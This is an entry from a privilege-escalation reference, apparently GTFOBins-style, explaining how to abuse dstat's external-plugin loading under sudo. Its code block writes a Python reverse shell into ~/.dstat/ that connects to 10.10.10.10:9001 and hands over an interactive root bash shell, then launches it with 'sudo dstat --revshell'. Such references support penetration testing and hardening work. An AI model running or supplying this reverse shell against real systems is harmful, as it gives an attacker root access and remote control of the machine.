---
functions:
  sudo:
    - description: |
        Spawn interactive root shell by loading a custom plugin.

        Dstat allows you to run arbitrary python scripts loaded as "external plugins" if they are located in one of the directories stated in the dstat man page under "FILES":

        1. `~/.dstat/`
        2. `(path of binary)/plugins/`
        3. `/usr/share/dstat/`
        4. `/usr/local/share/dstat/`

        Given that you have write access to one of these directories, you can drop there a script `dstat_revshell.py` and tell dstat to run it like this:
      code: |
        cat >~/.dstat/dstat_revshell.py<<EOF
        #!/usr/bin/python3
        from os import dup2
        from subprocess import run
        import socket
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("10.10.10.10",9001))
        dup2(s.fileno(),0)
        dup2(s.fileno(),1)
        dup2(s.fileno(),2)
        run(["/bin/bash","-i"])
        EOF

        sudo dstat --revshell
---
